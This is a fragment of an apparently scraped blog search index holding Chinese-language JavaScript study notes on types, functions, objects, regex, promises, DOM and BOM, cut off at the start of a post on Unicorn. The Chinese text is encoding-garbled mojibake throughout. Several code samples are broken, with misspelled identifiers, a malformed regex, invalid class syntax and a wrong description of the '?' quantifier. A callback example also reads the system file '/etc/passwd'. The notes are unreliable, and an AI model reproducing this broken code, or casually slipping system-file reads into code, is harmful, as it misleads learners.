'undefined';//(è¿™ç§ç±»å‹è¢«åˆ¤å®šä¸ºFalse)\n```\n\nâ–²javaScriptçš„æµ®ç‚¹æ•°æ“ä½œä¸ä¸€å®šå‡†ç¡®ï¼š\n\n0.1+0.2 = 0.300000.....04\n\né€šå¸¸ä½¿ç”¨(0.1x10+0.2x10)/10çš„å½¢å¼\n\nåœ¨å…¶ä»–è¯­è¨€ä¸­ä¹Ÿé€šå¸¸å­˜åœ¨çš„\n\n### (3)ç‰¹æ®Šç±»å‹\n\nnullå’Œundefinedçš„å€¼ç›¸ç­‰ï¼Œä½†æ˜¯ç±»å‹ä¸ä¸€æ ·ï¼Œnullçš„ç±»å‹æ˜¯object\n\n\n\n## 4.å®šä¹‰å‡½æ•°\n\n### (1)åˆå§‹å®šä¹‰\n\nfunction function_name(){ ....... }\n\næ²¡æœ‰å®šä¹‰è¿”å›å€¼çš„å‡½æ•°ä¹Ÿä¼šè¿”å›Undefinedçš„ç±»å‹ã€‚\n\n### (2)ä¼ å‚å®šä¹‰\n\nâ‘ å®šä¹‰function func(){...}\n\nä»ç„¶å¯ä»¥è°ƒç”¨func(a,b,c)è¿™ç§ç±»å‹ï¼Œä¼ å…¥çš„å‚æ•°a,b,cè¢«å­˜æ”¾åœ¨argumentsè¿™ä¸ªæ•°ç»„ä¸­ï¼Œå…¨å±€çš„æ•°ç»„ã€‚\n\nâ‘¡å®šä¹‰function func(x){ return x}\n\nå¯ä»¥è°ƒç”¨func()ï¼Œä¸ä¼ å‚ï¼Œå¦‚æœè¿”å›çš„æ˜¯undefinedç±»å‹çš„\n\n### (3)å®šä¹‰çš„hoisted\n\nå³å‡½æ•°å¯ä»¥å®šä¹‰åœ¨ä½¿ç”¨ä¹‹åï¼Œåº”è¯¥æ˜¯ç¼–è¯‘çš„æ—¶å€™è¿›è¡Œäº†æå‡æ“ä½œ\n\nå˜é‡ä¹Ÿå…·æœ‰è¿™ä¸ªæ•ˆæœï¼Œæ¯”å¦‚åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸‹çš„æ‰€æœ‰å˜é‡çš„ä½œç”¨åŸŸéƒ½æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯å…¶å€¼å¹¶æ²¡æœ‰å¾—åˆ°æå‡ã€‚\n\n\n\nå‡½æ•°å˜é‡çš„toStringå°±æ˜¯å‡½æ•°çš„å®šä¹‰è¡¨è¾¾å¼\n\n### (4)strictæ¨¡å¼\n\nå½“å‡½æ•°å®šä¹‰ä¸­ï¼ŒåŠ å…¥äº†\"use strict\"æ—¶ï¼Œä¼šå¯¹å˜é‡çš„å£°æ˜æœ‰æ›´ä¸¥æ ¼çš„è¦æ±‚ï¼Œä¸èƒ½ç®€å•åœ°ç›´æ¥èµ‹å€¼ã€‚\n\n### (5)non-hoistingæ¨¡å¼\n\n\n\n### (6)Letå…³é”®å­—\n\n```js\nvar x = 10\n\n{let x = 2}\n```\n\nletä½¿å¾—xåªåœ¨{...}è¿™ä¸ªå£°æ˜å—ä¸­æœ‰æ•ˆï¼Œå¤–é¢çš„è¯­å¥ä¸­xçš„å€¼ä¸º10ã€‚\n\n\n\n## 5.å®šä¹‰å¯¹è±¡\n\n### (1)åˆå§‹èµ‹å€¼\n\n```js\nlet user = {name:\"Alice\",age:23,country:\"China\"};\nvar d = new Date();//(æ—¥æœŸå¯¹è±¡)\n```\n\n### (2)å¢åŠ å±æ€§\n\n```js\nuser.fan = \"Banana\";\n```\n\n### (3)åˆ é™¤å±æ€§\n\n```js\ndelete user.name;\n```\n\n\n\n### (4)éå†å¯¹è±¡\n\n```js\nObject.keys(user);\nObject.values(user);\n```\n\nè·å–å˜é‡çš„keyå’Œvaluesçš„ç›¸å…³æ•°æ®\n\n\n\n## 6.å®šä¹‰æ•°ç»„(ç±»å‹ä¸ºobject)\n\n### (1)åˆå§‹å®šä¹‰\n\n```js\nvar anArr = [1,2,3];\n```\n\n### (2)ç›¸å…³æ“ä½œ\n\n```js\nanArr[5] = \"FooBar\";//(è¿™ä¸ªä¹Ÿæ˜¯å¯ä»¥çš„)\nanArr.length;//è¿”å›å€¼ä¸º6\nanArr.sort();//æ’åºç›¸å…³\n```\n\n### (3)æ•°æ®ç»“æ„ç›¸å…³æ“ä½œ\n\n#### â‘ å°¾éƒ¨æ“ä½œ\n\n```js\nanArr.push();\nanArr.pop();\n```\n\n#### â‘¡é¦–éƒ¨æ“ä½œ\n\n```js\nanArr.shift();\nanArr.unshift();\n```\n\n### (4)filteræ–¹æ³•\n\nåˆ›å»ºæ–°æ•°ç»„æ£€æµ‹åŸæ•°ç»„\n\n```javascript\nvar ages = [33,32,16,40];\nfunction checkAdult(age){\n    return age >= 18;\n}\nconsole.log(ages.filter(checkAdult));\nconsole.log(ages.filter(function(value){\n    return value >= 18;\n}))\n```\n\n\n\n## 7.æ­£åˆ™è¡¨è¾¾å¼\n\n### (1)å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼\n\n```js\nvar re = /ab+c/;//(ä½¿ç”¨ä¸¤ä¸ª/æ¥å®šä¹‰æ­£åˆ™)\nvar re2 = new RgeExp(\"ab+c\");//(ä½¿ç”¨å¯¹è±¡æ¥å®šä¹‰æ­£åˆ™)\n```\n\n### (2)è°ƒç”¨æ­£åˆ™\n\n#### â‘ å­—ç¬¦ä¸²å½¢å¼\n\n```js\n\"XXXXXXX abbbbc\".search(/ab+c);\n```\n\nè¿”å›å€¼ä¸ºæŸ¥æ‰¾åˆ°çš„ç´¢å¼•ï¼Œæ²¡æ‰¾åˆ°åˆ™è¿”å›-1\n\n#### â‘¡å¯¹è±¡è°ƒç”¨\n\n```js\nvar re = /ab+c/;\nre.exec(str);//è¿”å›reè¿™ä¸ªè¡¨ç¤ºå¼çš„æ‰§è¡Œç»“æœï¼Œè¿”å›åŒ…å«ç»“æœçš„ä¸€ä¸ªæ•°ç»„\n```\n\n### (3)æ¨¡å¼\n\n`...`è¡¨ä»»æ„å­—ç¬¦\n\n`+`è‡³å°‘ä¸€ä¸ª\n\n`*`0ä¸ªæˆ–å¤šä¸ª\n\n`?`0ä¸ªæˆ–å¤šä¸ª\n\n`\\d`æ‰¾ä¸€ä¸ªæ•°å­— **(digtal)**\n\n`\\s`æ‰¾ä¸€ä¸ªç©ºæ ¼ **(space)**\n\n`\\b`æ‰¾ä¸€ä¸ªå•è¯çš„å¼€å§‹æˆ–ç»“å°¾\n\n`g`å…¨å±€æ¨¡å¼ï¼Œåœ¨è¡¨è¾¾å¼æœ«å°¾åŠ ä¸Šgä»£è¡¨å…¨å±€ï¼Œè¿”å›æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„\n\næ¯”å¦‚åŒ¹é…abbbcå³å¯ç”¨`ab+c`\n\n`var re3 = /[^\\d]/;`è¡¨æŸ¥æ‰¾ä¸æ˜¯æ•°å­—çš„\n\n\n\n## 8.å¼‚å¸¸å¤„ç†\n\n```javascript\ntry{\n\tBlock of code....\n    throw \"Help!\";\n}catch(err){\n\tconsole.log(\"Error call\");\n}finally{\n    will be exec whatever there are some error....\n}\n```\n\n\n\n## 9.Debug\n\nåœ¨chromeä¸­å¯ä»¥è°ƒè¯•ï¼Œå³æµè§ˆå™¨\n\n\n\n## 10.æ–°çš„ç‰¹æ€§\n\n### (1)Modules\n\n```javascript\n//profile.js\nvar a = \"aa\";\nvar b = \"bb\";\nexport {a,b};\n\n//main.js\nimport {a,b} from './profile.js';\nfunction setName(element) {\n  element.textContent = a + ' ' + b;\n} \n```\n\n\n\n### (2)Default para\n\n```javascript\nfunction myFunc(a=1,b=\"Hello\"){\n\n}\n```\n\ndigtal + undefined = NaN\n\n### (3)Rest para\n\n```javascript\n//the ArgsArrayæ”¾ç½®çš„æ˜¯å¤šä½™çš„å‚æ•°\nfunction myFunc(a,b,... the_ArgsArray){\n\tvar c=the_ArgsArray[0];\n}\n\n\nfunction add(...values) {\n    let sum = 0;\n    for (var i=0;i<values.length;i++) {\n        sum += values[i];\n    }\n    return sum;\n}\n//2,5,3è¢«æ”¾ç½®åœ¨valuesæ•°ç»„ä¸­\nadd(2, 5, 3) //è¿”å›10\n```\n\n### (4)spread operator\n\n```javascript\nvar anArray=[1,2,3];\nmyFunc(...anArray);//å°†æ•°ç»„anArrayçš„æ¯ä¸ªå…ƒç´ ä½œä¸ºå‡½æ•°å‚æ•°ä¼ ç»™myFuncå‡½æ•°\nvar o=[5,...anArray,6];\n```\n\n### (5)æ¨¡æ¿ç±»å­—ç¬¦ä¸²string\n\n```javascript\nfunction formatGreetings(name,age){\n    var str=\n        `Hi ${name}  your age is  ${age}`;\n}//æ–°ç‰¹æ€§å­—ç¬¦ä¸²çš„æ‹¼æ¥\n```\n\n### (6)éå†\n\n```javascript\nlet sum=0;\nfor(ent of a){\n    sum+=ent;\n}\n```\n\n\n\n## 11.ç±»å’Œå¯¹è±¡\n\n### (1)å£°æ˜å’Œæ·»åŠ \n\n```javascript\nlet o = {oldProp:'old'};\no.aMethod = function(){\n\tthis.newProp = 'new';\n\treturn Object.keys(this);\n}\no.aMethod();\n//oçš„æˆå‘˜å³ä¸º[oldProp,newProp,aMethod]\n```\n\n### (2)å‡½æ•°å³ä¸ºå¯¹è±¡\n\n```javascript\nfunction func(value){\n\tconsole.log(this,arg);\n}\nfunc.toString();\nfunc.call({t:1},2);\n//callä½¿å¾—funcè¿™ä¸ªå¯¹è±¡å°±ä¼šå˜æˆ{t:1}\nlet newFunc = func.bind({z:2},3);\n//bindä¼šè¿”å›ä¸€ä¸ªæ–°çš„å¯¹è±¡ä¸º{z:2}\n//æ‰€æœ‰å¯¹è±¡éƒ½æœ‰toString,call,bindç­‰æ–¹æ³•\n```\n\n### (3)å®šä¹‰ç±»å’Œå®ä¾‹åŒ–\n\n```javascript\nfunction Rectangle(width,height){\n\tthis.width = width;\n\tthis.height = height;\n\tthis.area = function(){\n\t\treturn this.width*this.height;\n\t}\n}\nvar obj = new Rectangle(26,14);\n\n//æŸ¥çœ‹objdçš„æ„é€ æ–¹æ³•æ˜¯ä¸æ˜¯'Rectangle'\nobj.constructor.name == 'Rectangle'\n\n//ç»™Objå¢åŠ å±æ€§description\nobj.description = 'big Rectangle';\n\nvar obj2 = new Rectangle(2,3);\nobj2.tell = function(){\n    alert(width+\";\"+height);\n}\n//ä»¥ä¸Šæ–¹æ³•å¢åŠ çš„å±æ€§åœ¨å¯¹è±¡é‡Œï¼Œä¸åœ¨ç±»é‡Œ\n\nconsole.log(obj);\nconsole.log(obj2);\n```\n\n### (4)ä¸ºç±»å¢åŠ å±æ€§æ–¹æ³•\n\n```javascript\nfunction Rectangle(width,height){\n\tthis.width = width;\n\tthis.height = height;\n}\n\n//ä½¿ç”¨prototypeç»™Rectangleè¿™ä¸ªç±»å¢åŠ æˆå‘˜\nRectangle.prototype.area = function(){\n\treturn this.width*this,height;\n};\nRectangle.prototype.description = 'Hello!';\n//è¿™ç§æ–¹æ³•ç›¸å½“äºä¿®æ”¹ç±»çš„å®šä¹‰ï¼Œæ‰€æœ‰çš„å®ä¾‹åŒ–å¯¹è±¡éƒ½ä¼šè¢«ä¿®æ”¹æ‰\n```\n\n### (5)æ–°ç‰ˆçš„ç±»\n\n```javascript\nclass shape(){\n\tconstructor(str){this.str = str};\n}\nclass Rectangle extends shape = ...\n```\n\n## 12.å‡½æ•°å¼ç¼–ç¨‹\n\n### (1)å¤„ç†å­—ç¬¦ä¸²\n\n```javascript\nvar anArr = [45,4,9,16,25];\nfunction filterFunc(value){\n\treturn value<45;\n}\nfunction mapFunc(value,idx){\n\treturn value*idx;\n}\nfunction reduceFunc(total,value){\n    return total+value\n}\nanArr.filter(filterFunc).map(mapFunc).reduce(reduceFunc)\n```\n\n\n\n### (2)å›è°ƒå‡½æ•°\n\nä¸»è¦ç”¨æ¥è·Ÿè¸ªå¼‚æ­¥çš„å‡½æ•°è°ƒç”¨è¡Œä¸ºï¼Œç¡®ä¿æ­£å¸¸å¼‚æ­¥åŠ è½½ç»“æŸ\n\n```html\n<body>\n<script>\n    //å¯ä»¥å¼‚æ­¥è°ƒç”¨è¯¥å‡½æ•°,ä½¿å¾—è¯¥å‡½æ•°åé¢çš„å…¶ä»–è„šæœ¬ä¹ŸåŒæ—¶è¿è¡Œ\n    function loadScript(src){\n        let script = document.createElement('script');\n        scripte.src = src;\n        document.head.append(script);\n    }\n    loadScript('./myScript.js');\n    newFunction();\n    //å½“newFunction()åœ¨myScript.jsä¸­æ—¶ï¼Œå¦‚æœmyScript.jsæ²¡æœ‰åŠ è½½å®Œï¼Œåˆ™ç›´æ¥è°ƒç”¨\n    //newFunctionä¼šå‡ºé”™ï¼Œå› ä¸ºæ²¡æœ‰åŠ è½½ä¸Š\n    \n    \n    //ä½¿ç”¨å›è°ƒå‡½æ•°ç¡®ä¿è„šæœ¬åŠ è½½å®Œæˆå†è°ƒç”¨å…¶ä¸­çš„å‡½æ•° \n    function callbackFunc(){\n        newFunction();\n    }\n    function loadScript(src,callback){\n        let script = document.createElement('script');\n        scripte.src = src;\n        script.onload = () => callback(script);\n        document.head.append(script);\n    }\n    loadScript('./myScript.js');\n    //è¿™æ ·åœ¨loadScriptå‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åæ‰ä¼šæ‰§è¡ŒcallbackFuncä»è€Œè°ƒç”¨newFunction\n    \n\t//3*1000æ¯«ç§’åæ‰§è¡ŒcallbackFunc\n    setTimeout(callbackFunc,3*1000)\n    \n    //è¯»å®Œæ–‡ä»¶ä¹‹åå†è°ƒç”¨callbackFunc\n    function callbackFunc(err,data){\n        console.log(String(data));\n    }\n    fs.readFile('/etc/passwd',callbackFunc);\n    \n</script>\n</body>\n```\n\n#### â–²æ³¨\n\næ–¹æ³•ï¼šä»£è¡¨å¯¹è±¡é‡Œé¢çš„å‡½æ•°\n\nå‡½æ•°ï¼šå¯¹è±¡å¤–éƒ¨çš„å‡½æ•°\n\n### (3)é—­åŒ…\n\nå³åœ¨è°ƒç”¨å‡½æ•°å¯¹è±¡å†…éƒ¨çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¿®æ”¹å‡½æ•°å¯¹è±¡å†…çš„æˆå‘˜ï¼Œè¯¥æˆå‘˜å¯ä»¥å¾—åˆ°ä¿®æ”¹ä½¿ç”¨ï¼Œå°±ç±»ä¼¼äºjavaä¸­çš„æ¥å£è®¾ç½®ã€‚\n\n```javascript\nvar myObj = (function() {\n    var privateProp1 = 1; \n    var privateProp2 = \"test\";\n    var setPrivate1 = function(val1) { privateProp1 = val1; }\n    var compute = function() {return privateProp1 + privateProp2;}\n    return {compute: compute, setPrivate1: setPrivate1};\n})();\n//å³å¯ä»¥é€šè¿‡æ¥å£å‡½æ•°setPrivate1å’Œcomputeæ¥è®¿é—®å…¶privateProp1å’ŒprivateProp2\n```\n\n## 13.ç±»å‹åˆ¤æ–­\n\n`==`ï¼šåªåˆ¤æ–­å€¼ï¼Œfalseå’Œfalseæ¯”è¾ƒéƒ½ä¸ºtrue...\n\n`===`ï¼šåˆ¤æ–­ç±»å‹å’Œå€¼\n\n\n\n## 14.Promiseæ›¿ä»£å›è°ƒå‡½æ•°\n\nå°†æ‰§è¡Œç»“æœä¿å­˜ï¼Œç„¶ååˆ©ç”¨å‡½æ•°å¤„ç†\n\n```javascript\n//ç­‰å¾…1ç§’åæ‰§è¡Œresolveï¼Œå°†ç»“æœç»™åˆ°promise.resultä¸­\nlet promise = new Promise(function(resolve, reject) {\n    setTimeout(() => resolve(\"done!\"), 1000);\n});\n\n\n//ä¸€èˆ¬ç”¨æ¥å¤„ç†promiseçš„æ‰§è¡Œç»“æœ\npromise.then(\n    result => alert(result), // shows \"done!\" after 1 second\n    error => alert(error) // doesn't run\n);\n\n//catchåªå¤„ç†é”™è¯¯ç»“æœ\npromise.catch(error);\n```\n\nåŠ è½½è„šæœ¬çš„å¤„ç†\n\n```javascript\nfunction loadScript(src) {\n    return new Promise(function(resolve, reject) {\n        let script = document.createElement('script');\n        script.src = src;\n        script.onload = () => resolve(script);\n        script.onerror = () => reject(new Error(`Script load error for ${src}`));\n        document.head.append(script);\n    });\n}\nloadScript(src).then(func...);\n```\n\n## 15.async/awaitè¯­æ³•\n\nasyncå¼‚æ­¥æ‰§è¡Œ\n\ndeferæ ‡å¿—åæµè§ˆå™¨å®Œå…¨è§£æå®Œæ‰ä¼šæ‰§è¡Œscriptä»£ç \n\nç»å¸¸åŠ å…¥ asyncå’Œdeferæ¥ä½¿å¾—å¼‚æ­¥åŠ è½½domæ ‘ï¼Œä»å¤–éƒ¨å¼•å…¥javascriptä»£ç \n\n\n\n\n\n# äºŒã€JSON\n\nJSONå³JavaScriptå¯¹è±¡æ•°æ®çš„å­˜å‚¨å½¢å¼ï¼Œä¹Ÿç”¨æ¥å‘é€æ•°æ®\n\n## 1.åŸºæœ¬è¯­æ³•\n\n### (1)è½¬æ¢\n\n#### â‘ å¯¹è±¡è½¬JSONå­—ç¬¦ä¸²\n\n```js\nvar myJSON = JSON.stringify(obj);\ntypeof myJSON = 'string';\n```\n\n#### â‘¡JSONå­—ç¬¦ä¸²è½¬å¯¹è±¡\n\n```js\nvar s='{ \"name\":\"John\", \"age\":30, \"city\":\"New York\"}';\nvar myobj=JSON.parse(s);\ntypeof myobj=='object';\n```\n\n\n\n# ä¸‰ã€DOMæ ‘\n\næ–‡æ¡£å¯¹è±¡æ¨¡å‹\n\nä»¥æ–‡ä»¶å¤¹æ ‘çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œä¾æ®æ–‡æ¡£ç”ŸæˆDOMæ ‘\n\n```html\n<html>\n    <head>\n        <title> My title </title>\n    </head>\n    <body>\n        <a href=\"a.html\" > My link </a>\n       <h1> My header </h1>\n    </body>\n</html>\n```\n\nä»¥ä¸Šä»£ç å³å¯å½¢æˆä»¥ä¸‹çš„DOMæ ‘\n\n![image-20211125115502855](C:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20211125115502855.png)\n\né€šå¸¸è¿›è¡Œç»“ç‚¹ä¿®æ”¹ä¿¡æ¯\n\n## 1.åŸºæœ¬è¯­æ³•\n\n### (1)è·å–å±æ€§\n\n#### â‘ é€šè¿‡body\n\n```\nelement = document.body.firstChild.nextSibling.firstChild;\n```\n\næ¯”å¦‚ä»¥ä¸‹ç»“æ„\n\n```html\n<html>\n<body>\n Test\n\n  <div>Users:</div>\n  <ul>\n    <li>John</li>\n    <li>Pete</li>\n  </ul>\n\n  Final\n</body>\n</html>\n```\n\nå¯»å€divç»“ç‚¹\n\n```javascript\ndivNote = document.body.firstChild.nextSibling\n```\n\n#### â‘¡é€šè¿‡ID\n\n```html\n<p>Sample<b id=\"mb\">bold</b>display</p>\n```\n\nä»¥ä¸Šå½¢å¼çš„bç»“ç‚¹å¯é€šè¿‡å…¶IDæŸ¥æ‰¾\n\n```javascript\nbNote = document.getElementById('mb')\n```\n\n#### â‘¢å…¶ä»–æŸ¥æ‰¾å½¢å¼\n\nä»¥ä¸‹æ–¹æ³•å‡è¿”å›ä¸€ä¸ªæ•°ç»„\n\n##### A.tagName\n\n```html\n<body>\n    <p>Hello</p>\n    <p>Hello P</p>\n    <p>Hello DOM</p>\n</body>\n```\n\næŸ¥æ‰¾ï¼š\n\n```javascript\nvar tagPArr = document.getElementsByTagName(\"p\")//å¾—åˆ°ä¸‰ä¸ªç»“ç‚¹æ ‡ç­¾pçš„æ•°ç»„tagPArr\n```\n\n##### B.className\n\n```html\n<div class=\"example\">\n    A div element with class=\"example\"\n</div>\n<div class=\"example\">\n    Another div element with class=\"example\"\n</div>\n<p class=\"example\">A p element with \n    class=\"example\"</p>\n```\n\næŸ¥æ‰¾ï¼š\n\n```javascript\nvar classExampleArr = document.getElementsByClassName(\"example\")\n//å¾—åˆ°ä¸‰ä¸ªç»“ç‚¹classä¸ºexampleçš„æ•°ç»„\n```\n\n##### C.é€‰æ‹©ç¬¦æŸ¥æ‰¾\n\nè·å–æ‰€æœ‰æ ‡ç­¾ä¸º\"p\"çš„ç»“ç‚¹ï¼Œè¿”å›å¾—åˆ°ä¸€ä¸ªæ•°ç»„\n\n```javascript\nvar myNodelist = document.querySelectorAll(\"p\");\n```\n\n\n\n\n\n### (2)è®¾ç½®å±æ€§\n\n#### â‘ å¸¸è§„ä¿®æ”¹\n\n```html\n<script>\n    var op=document.getElementById(\"mp\");\n    console.log(op.textContent);//Samplebolddisplay\n    console.log(op.innertHTML);//Sample<b>bold</b>display\n    console.log(op.outerHTML);\n    //<p id=\"mp\">Sample<b>bold</b>display</p>\n    op.setAttribute(\"class\",\"cp\");\n    op.className = \"active\";\n    //cssç»“æ„å±æ€§ä¿®æ”¹\n    op.style.//....\n</script>\n```\n\n\n\n### (3)æ’å…¥æ–°ç»“ç‚¹\n\n```javascript\n//å…ˆç”Ÿæˆæ ‡ç­¾ä¸ºPçš„ç»“ç‚¹\npara = document.creatElement(\"P\");\n//ç”Ÿæˆæ–‡æœ¬å­—ç¬¦ä¸ºMy Textçš„ç»“ç‚¹\nnode = document.creatTextNode(\"My Text\");\n//å°†æ–‡æœ¬ç»“ç‚¹æ”¾åˆ°paraé‡Œï¼Œå½¢æˆ <p>My Text</p>  è¿™æ ·çš„ç»“ç‚¹\npara.appendChild(node);\n```\n\n\n\n### (4)å¸ƒå±€å±æ€§\n\nå¾—åˆ°å…ƒç´ åœ¨å½“å‰é¡µé¢ä¸­çš„åæ ‡\n\n![image-20211130111349453](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211130111349.png)\n\n#### â‘ è·å–å¸ƒå±€ä¿¡æ¯\n\n`position:`\n\n`relative`å³ä»£è¡¨è®¾ç½®ä¸ºå¯å®šä½çš„\n\n`absolute`ä»£è¡¨ä»¥æœ€è¿‘è®¾ç½®è¿‡postionçš„å…ƒç´ ä¸ºåŸºå‡†ï¼Œå¾€ä¸Šå±‚æ‰¾å…ƒç´ \n\nä¸è®¾ç½®postionçŠ¶æ€åˆ™ä¾æ¬¡æ’åˆ—\n\n```javascript\n//å…ƒç´ éœ€è¦å…ˆæ˜¯å®šä½è¿‡çš„ï¼Œå³positionå±æ€§è¢«è®¾ç½®\n//å¦‚æœæ²¡æœ‰å®šä½ï¼Œåˆ™é»˜è®¤offsetParentä¸ºbodyå…ƒç´ \nvar ofH = element.offsetHeight;\n```\n\n#### â‘¡è®¾ç½®å¸ƒå±€ä¿¡æ¯\n\n```javascript\nelement.style.position = \"absolute\";\nelement.style.left = \"40px\";\n```\n\n\n\n### (5)äº‹ä»¶å¤„ç†\n\n#### â‘ æ·»åŠ äº‹ä»¶å¤„ç†\n\n##### A.ç›´æ¥å®šä¹‰\n\n```html\n<div onclick=\"gotMouseClick('id42');\">...</div>\n\n//ç›´æ¥å¤„ç†è¯­å¥ä¸º\"this.innerHTML = 'Ooops!'\"\n<h1 onclick=\"this.innerHTML = 'Ooops!'\"> </h1>\n\n\n<!--HTMLä¸­ç›´æ¥å®šä¹‰å‡½æ•°å¤„ç†-->\n<h1 onclick=\"changeText(this)\"> </h1>\n<script>\nfunction changeText(id) { \n  id.innerHTML = \"Ooops!\";\n}\n</script>\n```\n\n##### B.DOMå®šä¹‰\n\n```javascript\n//è·å–å…ƒç´ ä¹‹åæ·»åŠ å¯¹åº”çš„å¤„ç†äº‹ä»¶\nelement.onclick = mouseClick;\n\n//æˆ–è€…\nelement.addEventListener(\"click\", mouseClick);\nelement.removeEventListener.....\n```\n\n#### â‘¡è·å–äº‹ä»¶ç›¸å…³ä¿¡æ¯\n\n```javascript\n//åœ¨äº‹ä»¶å‡½æ•°ä¸­çš„å¤„ç†,eventå³ä¸ºå½“å‰äº‹ä»¶çš„å¯¹è±¡\nconsole.log(event.timeStamp);\n```\n\n#### â‘¢å¤šäº‹ä»¶å¤„ç†ç›¸åº”é¡ºåº\n\n##### A.å†’æ³¡å¤„ç†æ–¹å¼ Bubbling\n\n```html\n<form onclick=\"alert('form')\">FORM\n  <div onclick=\"alert('div')\">DIV\n    <p onclick=\"alert('p')\">P</p>\n  </div>\n</form>\n```\n\nä»é‡Œå‘å¤–å¤„ç†ï¼Œå³p->div->formé¡ºåºå¤„ç†ç›¸åº”äº‹ä»¶\n\n##### B.åœæ­¢å†’æ³¡å¤„ç†\n\nåˆ°formå¤„ç†æ—¶åœæ­¢ä¼ æ’­\n\n```html\n<form \nonclick=\"event.stopPropagation()\">FORM\n  <div onclick=\"alert('div')\">DIV\n    <p onclick=\"alert('p')\">P</p>\n  </div>\n</form>\n```\n\n##### C.ä»å¤–å±‚å‘å†…å¤„ç† Capture\n\næ¯ä¸ªæ ‡ç­¾å‡æ·»åŠ é¼ æ ‡ç‚¹å‡»å¤„ç†äº‹ä»¶ï¼Œalert()å‡½æ•°çš„æ•è·çŠ¶æ€ä¸ºtrueå’Œfalse\n\n`true`:è®¾ç½®æ•è·çŠ¶æ€ä¸ºtrueï¼Œä½¿å…¶å¤„ç†**ä»å¤–å‘å†…**å¤„ç†\n\n`fasle`:è®¾ç½®æ•è·çŠ¶æ€ä¸ºfalseï¼Œä½¿å…¶å¤„ç†**ä»å†…å‘å¤–**å¤„ç†\n\n```html\n<style>\n    body * {\n        margin: 10px;\n        border: 1px solid blue;\n    }\n</style>\n<form>FORM\n    <div>DIV\n        <p>P</p>\n    </div>\n</form>\n<script>\n    for(let elem of document.querySelectorAll('*')) {\n        elem.addEventListener(\"click\",\n            e => alert(`Capturing: ${elem.tagName}`), true);\n    }\n</script>\n```\n\nåœæ­¢å¤„ç†ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæ·»åŠ stopPropagationäº‹ä»¶\n\nğŸ”ºW3Cå½¢å¼ä¸ºå…ˆCaptureå†Bubblingçš„ç»¼åˆå½¢å¼\n\n#### â‘£äº‹ä»¶çš„ç›®æ ‡\n\n\n\n#### â‘¤æ—¶é—´ç›¸å…³çš„äº‹ä»¶\n\n```js\nsetTimeout(func,50);\ntoken = setInterval(func,50);\nclearInterval(token);\n```\n\n#### â‘¥äº‹ä»¶çš„çº¿ç¨‹\n\nå•çº¿ç¨‹å¤„ç†äº‹ä»¶ï¼Œä¸ä¼šåŒæ—¶æ‰§è¡Œå¤šä¸ªäº‹ä»¶ã€‚è‹¥å­˜åœ¨å›è°ƒå‡½æ•°æ—¶ï¼Œä¹Ÿæ˜¯é¡ºåºè¿›è¡Œå¤„ç†çš„ï¼Œé¡ºåºå¯èƒ½ä¼šä¸å¤ªä¸€æ ·ã€‚\n\n\n\n\n\n# å››ã€BOMæ ‘\n\næµè§ˆå™¨ä¸­çš„å¯¹è±¡æ ‘\n\n`navigator`  `screen`  `location`  `history`\n\n## 1.åŸºæœ¬è¯­æ³•\n\n### (1)å¸¸è§å¯¹è±¡\n\n```js\n//locationå³å½“å‰é¡µé¢çš„htmlæ–‡ä»¶æŒ‡é’ˆ\nwindow.location.href = \"newPage.html\";\n\n//historyä¿å­˜ç”¨æˆ·è®¿é—®è¿‡çš„é¡µé¢ï¼Œä»¥ä¸‹ä¸ºæ‰§è¡Œå›é€€ä¸Šä¸€ä¸ªé¡µé¢æŒ‡ä»¤\nwindow.history.go(-1);\nhistory.go(-3); // Go back three pages\nhistory.go(3); // Go forward three pages \nhistory.back(); // Same as history.go(-1) \nhistory.forward();// Same as history.go(1)\n```\n\n![image-20211130111020329](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211229145548.png)\n\n\n\n## â–²æ³¨ï¼šdomå’Œscripté¡ºåºç”Ÿæˆé—®é¢˜\n\nrender treeæ˜¯æ¸²æŸ“çš„\n\nscriptä¼šå½±å“domæ ‘çš„æ„å»ºï¼Œhtmlä¸­åœ¨scriptä¹‹åçš„domæ ‘ç»“æ„ä¸ä¼šåœ¨scriptä¸­å­˜åœ¨ã€‚\n\n\n\n\n\n# äº”ã€å¤šä»£WebæŠ€æœ¯\n\n## 1.æ— çŠ¶æ€\n\nå³ä¸ä¿å­˜ç”¨æˆ·ä¿¡æ¯\n\n## 2.ç¬¬ä¸€ä»£\n\nPHP,ASP,.netç­‰åº”ç”¨\n\n## 3.ç¬¬äºŒä»£\n\nRuby on Rails,Djangoç­‰\n\nåˆ›å»ºmodel-view-controllers , Templatesç­‰\n\n#### Model:\n\nå¤§å¤šæ˜¯Java Scriptçš„å¯¹è±¡\n\n#### View:\n\nHTML/CSSç­‰\n\næœ€ç»ˆå‘ˆç°ç»™ç”¨æˆ·çš„Webæ¡†æ¶ï¼ŒHTMLåŠ ä¸Šå…¶ä»–çš„ä¸€äº›ä»£ç \n\n#### Controller:\n\næŒ‰é’®æ§å»ºç­‰\n\nåœ¨æœåŠ¡å™¨ä¸­è·å–modelè¿›è¡Œå¤„ç†ï¼Œå°†é¡µé¢å‘ˆç°å‡ºæ¥ï¼Œå¸¸è§çš„Java Scriptçš„æ‰§è¡Œä»£ç \n\n## 4.ç¬¬ä¸‰ä»£\n\nAngular JS\n\næ›´åŠ ç±»ä¼¼appã€‚\n\n## 5.ç¬¬å››ä»£\n\né€šè¿‡è™šæ‹Ÿçš„DOMæ ‘æ¥å½¢æˆé¡µé¢\n\n\n\n\n\n# Reactå°é¡¹ç›®ï¼š\n\n[I Love You â¤ï¸ (pig-007.github.io)](https://pig-007.github.io/xx520/)\n"},{"title":"Unicorn","url":"/2021/11/19/Unicorn/","content":"\n# ä¸€ã€åŠŸèƒ½ä»‹ç»\n\n## 1.åˆå§‹åŒ–\n\n### (1)å‰ç½®æ¨¡å—åŠæ¶æ„\n\n```python\n# -*- coding:UTF-8 -*-\nfrom __future__ import print_function\nfrom unicorn import *\nfrom unicorn.x86_const import 